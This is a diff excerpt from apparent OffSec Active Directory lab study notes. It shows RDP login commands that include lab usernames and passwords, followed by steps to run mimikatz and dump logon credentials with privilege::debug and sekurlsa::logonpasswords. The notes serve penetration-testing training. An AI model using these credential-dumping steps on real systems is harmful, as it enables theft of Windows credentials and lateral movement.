@@ -800,7 +800,8 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
      `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
    - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**  
      `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
-   - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe   
+   - Run terminal as Administrator  
+     `cd C:\tools\mimikatz\ > .\mimikatz.exe`     
    - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords  
      ```
      privilege::debug
